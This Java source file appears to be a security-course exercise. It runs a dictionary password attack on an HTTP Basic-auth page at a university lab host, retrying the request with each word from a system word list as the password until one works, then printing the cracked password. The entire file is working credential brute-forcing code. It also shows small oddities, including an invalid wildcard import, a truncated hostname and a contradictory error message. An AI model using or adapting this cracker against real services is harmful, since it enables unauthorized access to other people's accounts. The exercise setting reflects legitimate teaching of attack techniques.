



import java.io.*;
import java.*;
import java.net.*;

public class Dictionary
{

   static BufferedReader in = null;
   static MyAuthenticator Auth = new MyAuthenticator();

 
   public static void main(String[] args) throws IOException
   {
      int tmp = 0;
      String str ="";
      Authenticator.setDefault(Auth);
 
      try
      {
         URL url = new URL("http://sec-crack.cs.rmit.edu./SEC/2/index.php");

         
         
         while(tmp!=1)
         {
            try
            {
               in = new BufferedReader(new InputStreamReader(url.openStream()));
               tmp=1;
            }
            catch (IOException e) {}
            
         }         

         while ((str = in.readLine()) != null) 
         {
            
            
            
         }
         

         System.out.println("The successful Password found using a Dictionary search is = " + Auth.finalPass());

      } 
      catch (MalformedURLException e) 
         {System.out.println("mfURL");}
   }    


}

class MyAuthenticator extends Authenticator 
{
   String username = "";
   static String password = "";
   
   static String DictFile = "/usr/share/lib/dict/words";
   static BufferedReader fReader;

   public MyAuthenticator()
   {
      try
      {
          fReader = new BufferedReader
                            (new FileReader(DictFile));
      }
      catch (FileNotFoundException e)
      {
         System.out.println("File " +DictFile+ " Not Found");
         System.out.println(" File Opened");
         System.exit(1);
      }
      catch (IOException e)
      {
         System.out.println("File  Failed..");
         System.exit(1);
      }

   }

   static void setPass(String pswd)
   {
      password = pswd;
   }

   static String finalPass()
   {
      return password;
   }

   static String getPass()
   {
      try
      {
         if ((password = fReader.readLine()) == null)
         {
            System.out.println("Password Not found in file '" + DictFile +"'.");
            System.exit(1);
         }
      }
      catch (IOException ioe)
      {
         System.out.println("File IOException");
         System.out.println(ioe);
      }

      return password;
   }



   protected PasswordAuthentication getPasswordAuthentication() 
   { 
      
      return new PasswordAuthentication(username, getPass().toCharArray()); 

   } 
}
